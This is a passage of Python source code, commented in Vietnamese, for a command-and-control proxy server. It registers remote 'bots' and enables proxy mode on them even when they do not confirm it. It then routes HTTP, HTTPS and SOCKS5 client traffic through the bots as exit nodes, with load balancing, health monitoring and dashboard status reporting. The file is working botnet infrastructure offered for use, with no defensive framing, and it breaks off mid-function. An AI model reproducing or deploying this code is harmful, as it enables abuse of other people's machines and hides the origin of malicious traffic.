#!/usr/bin/env python3
"""
C2 PROXY SERVER
Server chính nhận proxy requests từ client và forward qua các bot exit nodes
"""

import socket
import threading
import time
import json
import hashlib
import base64
from datetime import datetime
from typing import Dict, List, Optional
from collections import deque
import random
import ssl

class C2ProxyServer:
    def __init__(self, c2_host="0.0.0.0", c2_port=3333, proxy_port=8080, socks_port=1080, client_port=3334):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.proxy_port = proxy_port
        self.socks_port = socks_port
        self.client_port = client_port
        # Load balancing strategy (round_robin, least_connections, health_based, random)
        self.load_balancing_strategy = "round_robin"
        
        # Bot management
        self.connected_bots = {}  # bot_id -> bot_info
        self.bot_exit_nodes = {}  # bot_id -> exit_node_info
        self.active_proxy_connections = {}
        
        # Load balancing
        self.load_balancer = ProxyLoadBalancer()
        self.health_monitor = BotHealthMonitor()
        
        # Statistics
        self.stats = {
            'total_requests': 0,
            'total_bytes_transferred': 0,
            'active_connections': 0,
            'failed_requests': 0,
            'start_time': datetime.now()
        }
        
        # Direct forward mode (should be False for real bot relaying)
        self.direct_mode = False
        
        # Server sockets
        self.c2_socket = None
        self.proxy_socket = None
        self.socks_socket = None
        self.client_socket = None
        self.running = False
        
    def start(self):
        """Khởi động C2 Proxy Server"""
        print("🚀 Starting C2 Proxy Server...")
        
        # Đặt cờ chạy TRƯỚC khi khởi động các threads accept
        # Tránh tình trạng threads kiểm tra self.running=False và thoát ngay
        self.running = True

        # Khởi động C2 server để nhận bot connections
        self.start_c2_server()
        
        # Khởi động proxy server để nhận client requests
        self.start_proxy_server()
        
        # Khởi động SOCKS5 server
        self.start_socks_server()
        
        # Khởi động client server để nhận commands từ web dashboard
        self.start_client_server()
        
        # Khởi động health monitoring
        self.start_health_monitoring()
        print(f"✅ C2 Proxy Server started successfully!")
        print(f"   🖥️  C2 Server: {self.c2_host}:{self.c2_port}")
        print(f"   🌐 HTTP Proxy: {self.c2_host}:{self.proxy_port}")
        print(f"   🧦 SOCKS5 Proxy: {self.c2_host}:{self.socks_port}")
        print(f"   🔗 Client Server: {self.c2_host}:{self.client_port}")
        print(f"   ⏰ Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"   🔄 Waiting for bot connections...")
        print(f"   📊 Ready to handle HTTP proxy requests...")
        print(f"   🧦 Ready to handle SOCKS5 proxy requests...")
        print(f"   🌐 Ready to handle client commands...")

    def set_load_balancing_strategy(self, strategy: str) -> bool:
        """Đổi chiến lược cân bằng tải"""
        allowed = {"round_robin", "least_connections", "health_based", "random"}
        if strategy not in allowed:
            print(f"❌ Invalid strategy: {strategy}")
            return False
        self.load_balancing_strategy = strategy
        print(f"⚖️  Load balancing strategy set to: {strategy}")
        return True

    def stop_bot(self, bot_id: str) -> bool:
        """Ngắt kết nối bot theo id"""
        try:
            if bot_id in self.connected_bots:
                self.disconnect_bot(bot_id)
                return True
            return False
        except Exception as e:
            print(f"❌ stop_bot error: {e}")
            return False

    def restart(self) -> bool:
        """Khởi động lại server (dừng và khởi động lại)"""
        try:
            self.stop()
            time.sleep(0.5)
            self.start()
            return True
        except Exception as e:
            print(f"❌ Restart failed: {e}")
            return False
        
    def start_c2_server(self):
        """Khởi động C2 server để nhận kết nối từ bot"""
        self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.c2_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.c2_socket.bind((self.c2_host, self.c2_port))
        self.c2_socket.listen(100)
        
        # Thread để accept bot connections
        threading.Thread(target=self.accept_bot_connections, daemon=True).start()
        
    def start_proxy_server(self):
        """Khởi động proxy server để nhận requests từ client"""
        self.proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.proxy_socket.bind((self.c2_host, self.proxy_port))
        self.proxy_socket.listen(100)
        
        # Thread để accept proxy requests
        threading.Thread(target=self.accept_proxy_requests, daemon=True).start()
        
    def start_socks_server(self):
        """Khởi động SOCKS5 server"""
        self.socks_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socks_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socks_socket.bind((self.c2_host, self.socks_port))
        self.socks_socket.listen(100)
        
        # Thread để accept SOCKS5 connections
        threading.Thread(target=self.accept_socks_connections, daemon=True).start()
        
    def start_client_server(self):
        """Khởi động client server để nhận commands từ web dashboard"""
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.client_socket.bind((self.c2_host, self.client_port))
        self.client_socket.listen(100)
        
        # Thread để accept client connections
        threading.Thread(target=self.accept_client_connections, daemon=True).start()
        
    def accept_bot_connections(self):
        """Accept kết nối từ bot"""
        while self.running:
            try:
                bot_socket, bot_addr = self.c2_socket.accept()
                print(f"🤖 New bot connection from {bot_addr}")
                
                # Thread để xử lý bot
                threading.Thread(
                    target=self.handle_bot_connection,
                    args=(bot_socket, bot_addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.running:
                    print(f"❌ Error accepting bot connection: {e}")
                    
    def accept_proxy_requests(self):
        """Accept proxy requests từ client"""
        while self.running:
            try:
                client_socket, client_addr = self.proxy_socket.accept()
                print(f"🌐 New proxy request from {client_addr}")
                
                # Thread để xử lý proxy request
                threading.Thread(
                    target=self.handle_proxy_request,
                    args=(client_socket, client_addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.running:
                    print(f"❌ Error accepting proxy request: {e}")
                    
    def accept_socks_connections(self):
        """Accept SOCKS5 connections từ client"""
        while self.running:
            try:
                client_socket, client_addr = self.socks_socket.accept()
                print(f"🧦 New SOCKS5 connection from {client_addr}")
                
                # Thread để xử lý SOCKS5 request
                threading.Thread(
                    target=self.handle_socks_request,
                    args=(client_socket, client_addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.running:
                    print(f"❌ Error accepting SOCKS5 connection: {e}")
                    
    def accept_client_connections(self):
        """Accept client connections từ web dashboard"""
        while self.running:
            try:
                client_socket, client_addr = self.client_socket.accept()
                print(f"🔗 New client connection from {client_addr}")
                
                # Thread để xử lý client commands
                threading.Thread(
                    target=self.handle_client_commands,
                    args=(client_socket, client_addr),
                    daemon=True
                ).start()
                
            except Exception as e:
                if self.running:
                    print(f"❌ Error accepting client connection: {e}")
                    
    def handle_bot_connection(self, bot_socket, bot_addr):
        """Xử lý kết nối từ bot"""
        bot_id = None
        try:
            # Nhận thông tin bot
            data = bot_socket.recv(1024).decode().strip()
            print(f"🔍 DEBUG: Received from {bot_addr}: '{data}'")
            if data.startswith("BOT_CONNECT:"):
                parts = data.split(":")
                if len(parts) >= 4:
                    bot_id = parts[1]
                    hostname = parts[2]
                    pid = parts[3]
                    
                    # Lưu thông tin bot
                    self.connected_bots[bot_id] = {
                        'socket': bot_socket,
                        'address': bot_addr,
                        'hostname': hostname,
                        'pid': pid,
                        'connected_at': datetime.now(),
                        'status': 'online',
                        'proxy_mode': False,
                        'requests_handled': 0,
                        'bytes_transferred': 0,
                        'last_seen': datetime.now()
                    }
                    
                    # Thông báo chi tiết khi bot kết nối thành công
                    print(f"✅ Bot {bot_id} ({hostname}) connected successfully")
                    print(f"   📍 Address: {bot_addr[0]}:{bot_addr[1]}")
                    print(f"   🖥️  Hostname: {hostname}")
                    print(f"   🔢 PID: {pid}")
                    print(f"   ⏰ Connected at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                    print(f"   🔗 Total bots connected: {len(self.connected_bots)}")
                    
                    # Gửi lệnh bật proxy mode
                    self.enable_bot_proxy_mode(bot_id)
                    
                    # Xử lý commands từ bot
                    self.handle_bot_commands(bot_id, bot_socket)
                    
        except Exception as e:
            print(f"❌ Error handling bot {bot_id}: {e}")
        finally:
            if bot_id and bot_id in self.connected_bots:
                self.disconnect_bot(bot_id)
                
    def enable_bot_proxy_mode(self, bot_id):
        """Bật chế độ proxy cho bot"""
        try:
            bot_info = self.connected_bots[bot_id]
            bot_socket = bot_info['socket']
            
            # Gửi lệnh bật proxy mode
            command = "ENABLE_PROXY_MODE\n"
            bot_socket.send(command.encode())
            
            # Đợi response từ bot (có thể nhận heartbeat trước)
            timeout = 10  # 10 seconds timeout
            start_time = time.time()
            response = None
            
            while time.time() - start_time < timeout:
                try:
                    data = bot_socket.recv(1024).decode().strip()
                    if data:
                        print(f"🔍 DEBUG: Bot {bot_id} response: '{data}'")
                        if data == "PROXY_MODE_ENABLED":
                            response = data
                            break
                        elif data.startswith("HEARTBEAT:"):
                            # Ignore heartbeat, continue waiting
                            continue
                        else:
                            # Other response, might be what we want
                            response = data
                            break
                except Exception as e:
                    print(f"❌ Error reading response: {e}")
                    break
            
            # Dù có nhận được PROXY_MODE_ENABLED hay không, vẫn đăng ký bot làm exit node (fail-open) để không chặn luồng
            if response != "PROXY_MODE_ENABLED":
                print(f"⚠️  Bot {bot_id} did not confirm PROXY_MODE_ENABLED (resp={response}), registering exit node fail-open")

            # Đăng ký bot làm exit node
            self.bot_exit_nodes[bot_id] = {
                'bot_id': bot_id,
                'status': 'active',
                'connections': 0,
                'max_connections': 50,
                'health_score': 100,
                'response_time': deque(maxlen=100),
                'last_health_check': datetime.now(),
                'total_requests': 0,
                'successful_requests': 0,
                'failed_requests': 0
            }

            # Đăng ký bot vào load balancer
            self.load_balancer.register_bot(bot_id, {
                'status': 'active',
                'connections': 0,
                'max_connections': 50,
                'health_score': 100,
                'response_time': deque(maxlen=100),
                'last_health_check': datetime.now(),
                'total_requests': 0,
                'successful_requests': 0,
                'failed_requests': 0
            })

            bot_info['proxy_mode'] = True
            print(f"🔗 Bot {bot_id} enabled as proxy exit node")
            print(f"   🚀 Proxy mode: ACTIVE")
            print(f"   📊 Max connections: {self.bot_exit_nodes[bot_id]['max_connections']}")
            print(f"   💚 Health score: {self.bot_exit_nodes[bot_id]['health_score']}")
            print(f"   🔄 Total exit nodes: {len(self.bot_exit_nodes)}")
            
        except Exception as e:
            print(f"❌ Error enabling proxy mode for bot {bot_id}: {e}")
            
    def handle_bot_commands(self, bot_id, bot_socket):
        """Xử lý commands từ bot"""
        buffer = b""
        while self.running and bot_id in self.connected_bots:
            try:
                chunk = bot_socket.recv(4096)
                if not chunk:
                    break
                buffer += chunk
                # Process frames: commands are ASCII lines, RESP frames are "RESP:<id>:\n<bytes>" until next header
                # Handle line-based small commands first
                while b"\n" in buffer:
                    line, sep, remainder = buffer.partition(b"\n")
                    text = line.decode(errors='ignore')
                    if text.startswith("RESP:") or text.startswith("DATA:"):
                        # This is a frame header that precedes binary; keep header in buffer for pump
                        buffer = line + sep + remainder
                        break
                    buffer = remainder
                    if text == "PONG":
                        self.connected_bots[bot_id]['last_seen'] = datetime.now()
                    elif text.startswith("PROXY_ERROR:"):
                        self.handle_bot_proxy_error(bot_id, text)
                    elif text.startswith("HEALTH_REPORT:"):
                        self.handle_bot_health_report(bot_id, text[14:])
                # Hand off remaining buffer (may contain RESP frames) to pump
                self._pump_bot_to_client(bot_id, bot_socket, prebuffer=buffer)
                buffer = b""
            except Exception as e:
                print(f"❌ Error handling commands from bot {bot_id}: {e}")
                break
                
    def serialize_for_json(self, obj):
        """Convert objects to JSON serializable format"""
        if isinstance(obj, datetime):
            return obj.isoformat()
        elif isinstance(obj, dict):
            return {k: self.serialize_for_json(v) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [self.serialize_for_json(item) for item in obj]
        elif isinstance(obj, tuple):
            return list(obj)
        else:
            return obj

    def handle_client_commands(self, client_socket, client_addr):
        """Xử lý commands từ client (web dashboard)"""
        try:
            data = client_socket.recv(4096).decode().strip()
            print(f"🔍 DEBUG: Received command from {client_addr}: '{data}'")
            if not data:
                return
                
            if data == "GET_STATUS":
                # Gửi trạng thái server
                status = self.get_status()
                response = json.dumps(status, default=str, indent=2)
                print(f"🔍 DEBUG: Sending response: {response[:200]}...")
                client_socket.send(response.encode())
                
            elif data == "GET_BOTS":
                # Gửi danh sách bots
                bots = []
                for bot_id, bot_info in self.connected_bots.items():
                    exit_node_info = self.bot_exit_nodes.get(bot_id, {})
                    bot_data = {
                        'bot_id': bot_id,
                        'hostname': bot_info.get('hostname', 'Unknown'),
                        'address': bot_info.get('address', ('Unknown', 0)),
                        'status': bot_info.get('status', 'unknown'),
                        'connected_at': bot_info.get('connected_at', datetime.now()).isoformat(),
                        'last_seen': bot_info.get('last_seen', datetime.now()).isoformat(),
                        'proxy_mode': bot_info.get('proxy_mode', False),
                        'requests_handled': bot_info.get('requests_handled', 0),
                        'bytes_transferred': bot_info.get('bytes_transferred', 0),
                        'exit_node_info': {
                            'status': exit_node_info.get('status', 'inactive'),
                            'connections': exit_node_info.get('connections', 0),
                            'max_connections': exit_node_info.get('max_connections', 0),
                            'health_score': exit_node_info.get('health_score', 0),
                            'total_requests': exit_node_info.get('total_requests', 0),
                            'successful_requests': exit_node_info.get('successful_requests', 0),
                            'failed_requests': exit_node_info.get('failed_requests', 0)
                        }
                    }
                    bots.append(bot_data)
                response = json.dumps(bots, default=str, indent=2)
                client_socket.send(response.encode())
                
            elif data == "GET_CONNECTIONS":
                # Gửi danh sách kết nối
                connections = []
                for conn_id, conn_info in self.active_proxy_connections.items():
                    connection_data = {
                        'connection_id': conn_id,
                        'client_addr': conn_info.get('client_addr', ('Unknown', 0)),
                        'bot_id': conn_info.get('bot_id', 'Unknown'),
                        'target_host': conn_info.get('target_host', 'Unknown'),
                        'target_port': conn_info.get('target_port', 0),
                        'is_https': conn_info.get('is_https', False),
                        'start_time': conn_info.get('start_time', datetime.now()).isoformat(),
                        'bytes_transferred': conn_info.get('bytes_transferred', 0)
                    }
                    connections.append(connection_data)
                response = json.dumps(connections, default=str, indent=2)
                client_socket.send(response.encode())
                
        except Exception as e:
            print(f"❌ Error handling client commands: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
                
    def handle_proxy_request(self, client_socket, client_addr):
        """Xử lý proxy request từ client"""
        connection_id = f"{client_addr[0]}:{client_addr[1]}:{int(time.time())}"
        
        try:
            # Đọc HTTP request
            request_data = client_socket.recv(4096)
            if not request_data:
                return
                
            # Parse HTTP request
            request_str = request_data.decode()
            target_host, target_port, is_https = self.parse_http_request(request_str)
            
            if not target_host:
                client_socket.send(b"HTTP/1.1 400 Bad Request\r\n\r\n")
                return
                
            # If direct mode is enabled, bypass bots and relay directly
            if self.direct_mode:
                print(f"🔧 Direct mode enabled - relaying directly to {target_host}:{target_port}")
                self.direct_proxy_relay(client_socket, request_data, target_host, target_port, is_https)
                self.stats['total_requests'] += 1
                return
            
            # Otherwise choose bot exit node
            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
            if not selected_bot:
                print(f"❌ No available exit nodes for proxy request from {client_addr}")
                client_socket.send(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
                return
                
            print(f"🌐 New proxy request from {client_addr}")
            print(f"   🎯 Target: {target_host}:{target_port} ({'HTTPS' if is_https else 'HTTP'})")
            print(f"   🤖 Selected bot: {selected_bot}")
            print(f"   🔗 Connection ID: {connection_id}")
                
            # Tạo proxy connection
            self.active_proxy_connections[connection_id] = {
                'client_socket': client_socket,
                'client_addr': client_addr,
                'bot_id': selected_bot,
                'target_host': target_host,
                'target_port': target_port,
                'is_https': is_https,
                'start_time': datetime.now(),
                'bytes_transferred': 0
            }
            
            # Forward request đến bot
            self.forward_request_to_bot(connection_id, request_data)
            
            # Update statistics
            self.stats['total_requests'] += 1
            self.stats['active_connections'] += 1
            
        except Exception as e:
            print(f"❌ Error handling proxy request: {e}")
            self.stats['failed_requests'] += 1
        finally:
            if connection_id in self.active_proxy_connections:
                self.cleanup_proxy_connection(connection_id)

    def direct_proxy_relay(self, client_socket, initial_request, target_host, target_port, is_https):
        """Relays traffic directly between client and target. For HTTPS (CONNECT), establishes a tunnel."""
        try:
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.settimeout(10)
            target_sock.connect((target_host, target_port))
            target_sock.settimeout(None)
            
            if is_https:
                # Respond 200 to establish tunnel
                try:
                    client_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
                except Exception:
                    target_sock.close()
                    return
                # After CONNECT, start bidirectional relay
                self._relay_bidirectional(client_socket, target_sock)
            else:
                # HTTP: forward initial request then relay responses
                try:
                    target_sock.sendall(initial_request)
                except Exception:
                    target_sock.close()
                    return
                # Relay target->client and client->target (in case of subsequent requests)
                self._relay_bidirectional(client_socket, target_sock)
        except Exception as e:
            try:
                client_socket.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
            except Exception:
                pass
            print(f"❌ Direct relay error: {e}")
        finally:
            try:
                client_socket.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                client_socket.close()
            except Exception:
                pass

    def _relay_bidirectional(self, sock_a, sock_b):
        """Bidirectional relay between two sockets until either closes."""
        def pump(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception:
                pass
            finally:
                try:
                    dst.shutdown(socket.SHUT_WR)
                except Exception:
                    pass
        t1 = threading.Thread(target=pump, args=(sock_a, sock_b), daemon=True)
        t2 = threading.Thread(target=pump, args=(sock_b, sock_a), daemon=True)
        t1.start(); t2.start()
        t1.join(); t2.join()
                
    def parse_http_request(self, request_str):
        """Parse HTTP request để lấy target host và port"""
        try:
            lines = request_str.split('\n')
            first_line = lines[0].strip()
            
            if first_line.startswith('CONNECT'):
                # HTTPS CONNECT method
                parts = first_line.split()
                if len(parts) >= 2:
                    host_port = parts[1]
                    if ':' in host_port:
                        host, port = host_port.split(':', 1)
                        return host, int(port), True
                    else:
                        return host_port, 443, True
                        
            elif first_line.startswith(('GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS')):
                # HTTP request
                for line in lines:
                    if line.lower().startswith('host:'):
                        host_port = line.split(':', 1)[1].strip()
                        if ':' in host_port:
                            host, port = host_port.split(':', 1)
                            return host, int(port), False
                        else:
                            return host_port, 80, False
                            
        except Exception as e:
            print(f"❌ Error parsing HTTP request: {e}")
            
        return None, None, False
        
    def handle_socks_request(self, client_socket, client_addr):
        """Xử lý SOCKS5 request từ client"""
        connection_id = f"socks_{client_addr[0]}:{client_addr[1]}:{int(time.time())}"
        
        try:
            # SOCKS5 handshake
            # Step 1: Client sends version and authentication methods
            data = client_socket.recv(1024)
            if len(data) < 3:
                client_socket.close()
                return
                
            version, nmethods = data[0], data[1]
            if version != 5:  # SOCKS5
                client_socket.close()
                return
                
            # Step 2: Server responds with chosen method (0 = no auth)
            client_socket.send(b'\x05\x00')
            
            # Step 3: Client sends connection request
            data = client_socket.recv(1024)
            if len(data) < 10:
                client_socket.close()
                return
                
            version, cmd, rsv, atyp = data[0], data[1], data[2], data[3]
            if version != 5 or cmd != 1:  # CONNECT command
                client_socket.close()
                return
                
            # Parse destination address
            if atyp == 1:  # IPv4
                target_host = socket.inet_ntoa(data[4:8])
                target_port = int.from_bytes(data[8:10], 'big')
            elif atyp == 3:  # Domain name
                addr_len = data[4]
                target_host = data[5:5+addr_len].decode()
                target_port = int.from_bytes(data[5+addr_len:7+addr_len], 'big')
            else:
                client_socket.close()
                return
                
            print(f"🧦 SOCKS5 request from {client_addr}")
            print(f"   🎯 Target: {target_host}:{target_port}")
            print(f"   🔗 Connection ID: {connection_id}")
            
            # Chọn bot exit node
            selected_bot = self.load_balancer.select_bot(self.bot_exit_nodes, strategy=self.load_balancing_strategy)
            if not selected_bot:
                print(f"❌ No available exit nodes for SOCKS5 request from {client_addr}")
                # Send SOCKS5 error response
                client_socket.send(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
                
            # Tạo proxy connection
            self.active_proxy_connections[connection_id] = {
                'client_socket': client_socket,
                'client_addr': client_addr,
                'bot_id': selected_bot,
                'target_host': target_host,
                'target_port': target_port,
                'is_https': False,  # SOCKS5 doesn't distinguish HTTP/HTTPS
                'is_socks': True,
                'start_time': datetime.now(),
                'bytes_transferred': 0
            }
            
            # Send SOCKS5 success response
            client_socket.send(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
            
            # Forward request đến bot
            self.forward_socks_request_to_bot(connection_id, target_host, target_port)
            
            # Update statistics
            self.stats['total_requests'] += 1
            self.stats['active_connections'] += 1
            
        except Exception as e:
            print(f"❌ Error handling SOCKS5 request: {e}")
            self.stats['failed_requests'] += 1
        finally:
            if connection_id in self.active_proxy_connections:
                self.cleanup_proxy_connection(connection_id)
                
    def forward_socks_request_to_bot(self, connection_id, target_host, target_port):
        """Forward SOCKS5 request đến bot exit node"""
        try:
            connection = self.active_proxy_connections[connection_id]
            bot_id = connection['bot_id']
            bot_info = self.connected_bots[bot_id]
            bot_socket = bot_info['socket']
            
            # Tạo command để gửi đến bot
            command = f"SOCKS_REQUEST:{connection_id}:{target_host}:{target_port}\n"
            bot_socket.send(command.encode())
            
            # Update bot statistics
            self.bot_exit_nodes[bot_id]['connections'] += 1
            self.bot_exit_nodes[bot_id]['total_requests'] += 1
            
        except Exception as e:
            print(f"❌ Error forwarding SOCKS5 request to bot: {e}")
            self.stats['failed_requests'] += 1
        
    def forward_request_to_bot(self, connection_id, request_data):
        """Forward request đến bot exit node"""
        try:
            connection = self.active_proxy_connections[connection_id]
            bot_id = connection['bot_id']
            bot_info = self.connected_bots[bot_id]
            bot_socket = bot_info['socket']
            
            # Tạo command để gửi đến bot (framed protocol)
            command = f"PROXY_REQUEST:{connection_id}:{connection['target_host']}:{connection['target_port']}:{str(connection['is_https']).lower()}\n"
            bot_socket.sendall(command.encode())

            # Gửi frame DATA đầu tiên (nếu là HTTP)
            if not connection['is_https'] and request_data:
                self._send_data_frame_to_bot(bot_socket, connection_id, request_data)

            # Bắt đầu 2 chiều: client->bot (DATA frames) và bot->client (RESP frames)
            threading.Thread(target=self._pump_client_to_bot, args=(connection_id,), daemon=True).start()
            
            # Update bot statistics
            self.bot_exit_nodes[bot_id]['connections'] += 1
            self.bot_exit_nodes[bot_id]['total_requests'] += 1
            
        except Exception as e:
            print(f"❌ Error forwarding request to bot: {e}")
            self.stats['failed_requests'] += 1
            
    def handle_bot_proxy_response(self, bot_id, response_data):
        """Framed RESP handling is done in _pump_bot_to_client; keep method for compatibility"""
        pass
            
    def handle_bot_proxy_error(self, bot_id, error_data):
        """Xử lý error từ bot"""
        try:
            # Bot gửi theo định dạng: "PROXY_ERROR:<id>:<message>"
            if error_data.startswith('PROXY_ERROR:'):
                parts = error_data.split(':', 2)
                connection_id = parts[1] if len(parts) > 1 else None
                
                if connection_id in self.active_proxy_connections:
                    connection = self.active_proxy_connections[connection_id]
                    client_socket = connection['client_socket']
                    
                    # Gửi error response về client
                    error_response = "HTTP/1.1 502 Bad Gateway\r\n\r\n"
                    client_socket.send(error_response.encode())
                    
                    # Update statistics
                    self.bot_exit_nodes[bot_id]['failed_requests'] += 1
                    self.stats['failed_requests'] += 1
                    
        except Exception as e:
            print(f"❌ Error handling bot proxy error: {e}")

    def _send_data_frame_to_bot(self, bot_socket, connection_id, payload_bytes):
        try:
            header = f"DATA:{connection_id}:\n".encode()
            bot_socket.sendall(header + payload_bytes)
        except Exception as e:
            print(f"❌ Error sending DATA frame to bot {connection_id}: {e}")

    def _pump_client_to_bot(self, connection_id):
        """Read from client socket and send DATA frames to bot until closed."""
        try:
            if connection_id not in self.active_proxy_connections:
                return
            conn = self.active_proxy_connections[connection_id]
            client_sock = conn['client_socket']
            bot_id = conn['bot_id']
            bot_sock = self.connected_bots[bot_id]['socket']
            while True:
                data = client_sock.recv(4096)
                if not data:
                    # notify bot end
                    try:
                        bot_sock.sendall(f"END:{connection_id}\n".encode())
                    except Exception:
                        pass
                    break
                self._send_data_frame_to_bot(bot_sock, connection_id, data)
        except Exception as e:
            print(f"❌ pump client->bot error {connection_id}: {e}")

    def _pump_bot_to_client(self, bot_id, bot_socket, prebuffer=b""):
        """Parse RESP frames from bot and write to client."""
        buffer = prebuffer
        try:
            while True:
                if b"\n" not in buffer:
                    chunk = bot_socket.recv(4096)
                    if not chunk:
                        break
                    buffer += chunk
                    continue
                line, _, buffer = buffer.partition(b"\n")
                header = line.decode(errors='ignore')
                if header.startswith("RESP:"):
                    # header: RESP:<id>:
                    parts = header.split(":")
                    if len(parts) < 3:
                        continue
                    connection_id = parts[1]
                    # Read until next header start or socket close
                    payload = b""
                    while True:
                        # Peek for next header line
                        if b"\n" in buffer and (buffer.startswith(b"RESP:") or buffer.startswith(b"END:") or buffer.startswith(b"ERR:") or buffer.startswith(b"DATA:")):
                            break
                        if not buffer:
                            chunk = bot_socket.recv(4096)
                            if not chunk:
                                break
                            buffer += chunk
                            continue
                        payload += buffer
                        buffer = b""
                    # Write payload to client
                    if connection_id in self.active_proxy_connections:
                        try:
                            client_sock = self.active_proxy_connections[connection_id]['client_socket']
                            if payload:
                                client_sock.sendall(payload)
                                self.stats['total_bytes_transferred'] += len(payload)
                        except Exception:
                            pass
                elif header.startswith("END:"):
                    parts = header.split(":")
                    if len(parts) >= 2:
                        cid = parts[1]
                        if cid in self.active_proxy_connections:
                            self.cleanup_proxy_connection(cid)
                elif header.startswith("ERR:"):
                    parts = header.split(":", 2)
                    cid = parts[1] if len(parts) > 1 else None
                    if cid in self.active_proxy_connections:
                        try:
                            self.active_proxy_connections[cid]['client_socket'].sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
                        except Exception:
                            pass
                        self.cleanup_proxy_connection(cid)
                else:
                    # Ignore unknown headers
                    pass
        except Exception as e:
            print(f"❌ pump bot->client error: {e}")
            
    def handle_bot_health_report(self, bot_id, health_data):
        """Xử lý health report từ bot"""
        try:
            health_info = json.loads(health_data)
            
            if bot_id in self.bot_exit_nodes:
                self.bot_exit_nodes[bot_id]['health_score'] = health_info.get('health_score', 100)
                self.bot_exit_nodes[bot_id]['last_health_check'] = datetime.now()
                
                # Update response time
                if 'response_time' in health_info:
                    self.bot_exit_nodes[bot_id]['response_time'].append(health_info['response_time'])
                    
        except Exception as e:
            print(f"❌ Error handling bot health report: {e}")
            
    def cleanup_proxy_connection(self, connection_id):
        """Cleanup proxy connection"""
        if connection_id in self.active_proxy_connections:
            connection = self.active_proxy_connections[connection_id]
            
            # Close client socket
            try:
                connection['client_socket'].close()
            except:
                pass
                
            # Update bot statistics
            bot_id = connection['bot_id']
            if bot_id in self.bot_exit_nodes:
                self.bot_exit_nodes[bot_id]['connections'] = max(0, 
                    self.bot_exit_nodes[bot_id]['connections'] - 1)
                    
            # Update global statistics
            self.stats['active_connections'] = max(0, 
                self.stats['active_connections'] - 1)
                
            # Remove connection
            del self.active_proxy_connections[connection_id]
            
    def disconnect_bot(self, bot_id):
        """Disconnect bot"""
        if bot_id in self.connected_bots:
            bot_info = self.connected_bots[bot_id]
            
            # Close bot socket
            try:
                bot_info['socket'].close()
            except:
                pass
                
            # Remove from exit nodes
            if bot_id in self.bot_exit_nodes:
                del self.bot_exit_nodes[bot_id]
                
            # Remove from connected bots
            del self.connected_bots[bot_id]
            
            print(f"👋 Bot {bot_id} disconnected")
            print(f"   ⏰ Disconnected at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"   🔗 Remaining bots: {len(self.connected_bots)}")
            print(f"   🔄 Remaining exit nodes: {len(self.bot_exit_nodes)}")
            
    def start_health_monitoring(self):
        """Khởi động health monitoring"""
        def monitor_health():
            while self.running:
                try:
                    self.health_monitor.check_bot_health(self.connected_bots, self.bot_exit_nodes)
                    time.sleep(30)  # Check every 30 seconds
                except Exception as e:
                    print(f"❌ Error in health monitoring: {e}")
                    
        threading.Thread(target=monitor_health, daemon=True).start()
        
    def get_status(self):
        """Lấy trạng thái server"""
        # Convert stats to serializable format
        stats = self.stats.copy()
        if 'start_time' in stats and isinstance(stats['start_time'], datetime):
            stats['start_time'] = stats['start_time'].isoformat()
            
        return {
            'running': self.running,
            'connected_bots': len(self.connected_bots),
            'active_exit_nodes': len(self.bot_exit_nodes),
            'active_proxy_connections': len(self.active_proxy_connections),
            'stats': stats,
            'bots': list(self.connected_bots.keys()),
            'exit_nodes': list(self.bot_exit_nodes.keys())
        }
        
    def stop(self):
        """Dừng server"""
        print("🛑 Stopping C2 Proxy Server...")
        print(f"   ⏰ Stopped at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"   🔗 Active bots: {len(self.connected_bots)}")
        print(f"   🌐 Active connections: {len(self.active_proxy_connections)}")
        self.running = False
        
        # Close all connections
        for connection in self.active_proxy_connections.values():
            try:
                connection['client_socket'].close()
            except:
                pass
                
        for bot_info in self.connected_bots.values():
            try:
                bot_info['socket'].close()
            except:
                pass
                
        # Close server sockets
        if self.c2_socket:
            self.c2_socket.close()
        if self.proxy_socket:
            self.proxy_socket.close()
        if self.socks_socket:
            self.socks_socket.close()
        if self.client_socket:
            self.client_socket.close()
            
        print("✅ C2 Proxy Server stopped")

class ProxyLoadBalancer:
    def __init__(self):
        self.current_bot_index = 0
        self.registered_bots = {}
        
    def register_bot(self, bot_id, bot_info):
        """Đăng ký bot vào danh sách load balancer (tối thiểu để tương thích)."""
        self.registered_bots[bot_id] = bot_info
        
    def unregister_bot(self, bot_id):
        """Hủy đăng ký bot khỏi load balancer."""
        if bot_id in self.registered_bots:
            del self.registered_bots[bot_id]
        
    def select_bot(self, bot_exit_nodes, strategy="round_robin"):
        """Chọn bot exit node"""
        if not bot_exit_nodes:
            return None
            
        active_bots = {bot_id: info for bot_id, info in bot_exit_nodes.items() 
